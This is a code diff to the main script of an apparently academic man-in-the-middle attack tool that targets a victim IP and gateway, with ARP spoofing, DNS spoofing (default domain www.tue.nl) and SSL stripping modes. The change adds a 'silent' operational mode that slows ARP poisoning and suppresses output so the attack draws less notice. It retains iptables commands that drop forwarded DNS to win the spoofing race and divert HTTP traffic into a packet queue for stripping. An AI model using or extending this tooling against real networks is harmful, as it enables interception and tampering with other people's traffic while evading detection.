@@ -22,8 +22,23 @@ def main():
     parser.add_argument("--attacker", help="IP address of the attacker machine (for DNS spoofing)")
     parser.add_argument("--target-domain", default="www.tue.nl", help="Domain to spoof (for DNS spoofing). Default: www.tue.nl")
     parser.add_argument("--interface", help="Network interface for SSL stripping e.g. ens33 (for SSL stripping)")
+
+    # Operational mode
+    parser.add_argument("--op-mode", choices=["silent", "allout", "default"], default="default", help="Operational mode: 'silent' (no output), 'allout' (aggressive logging)")
     args = parser.parse_args()
 
+
+    arp_interval = 2
+    verbose = True
+
+    if args.op_mode == "silent":
+        print("[*] Running in SILENT mode. Minimal console output.")
+        arp_interval = 5
+        verbose = False
+    elif args.op_mode == "allout":
+        print("[*] Running in ALLOUT mode. Aggressive logging enabled.")
+        arp_interval = 1
+        verbose = True
 
     if args.mode == "dns" and not args.attacker:
         print("[-] Attacker IP is required for DNS spoofing mode.")
@@ -54,7 +69,7 @@ def main():
         # Start ARP Spoofing in a speerate thread
         arp_thread = threading.Thread(
             target=arp.start_arp_spoof, 
-            args=(args.victim, args.gateway, victim_mac, gateway_mac),
+            args=(args.victim, args.gateway, victim_mac, gateway_mac, arp_interval, verbose),
             daemon=True
         )
         arp_thread.start()
@@ -62,28 +77,23 @@ def main():
         
         # ARP-Only mode
         if args.mode == 'arp':
-            print("[+] Running in ARP-Only mode. Intercepting traffic without modification.")
+            pass
 
         # Start DNS Spoofing if enabled
         elif args.mode == "dns":
-            print(f"[+] Starting DNS Spoofing for domain {args.target_domain} to {args.attacker}...")
-            print("[*] Drop DNS packets to win the race condition..")
+            # iptables rule to drop DNS requests to win race condition
             os.system("sudo iptables -A FORWARD -p udp --dport 53 -j DROP")
             dns_thread = threading.Thread(
                 target=dns.start_dns_spoof,
-                args=(args.target_domain, args.attacker),
+                args=(args.target_domain, args.attacker, verbose),
                 daemon=True
             )
             dns_thread.start()
 
         # Start SSL Stripping if enabled
         elif args.mode == "ssl":
-            print(f"[+] Starting SSL Stripping on {args.interface}...")
-            print(f"[*] Redirecting HTTPS traffic to NFQUEUE")
-            # Rule 1: Catch Requests (Going to server)
+            # iptables rules to catch requests & responses
             os.system("iptables -I FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 0")
-            
-            # Rule 2: Catch Responses (Coming from server) <--- THIS WAS MISSING
             os.system("iptables -I FORWARD -p tcp --sport 80 -j NFQUEUE --queue-num 0")
             sslstrip_thread = threading.Thread(
                 target=sslstrip.start_sslstrip_netfilter,
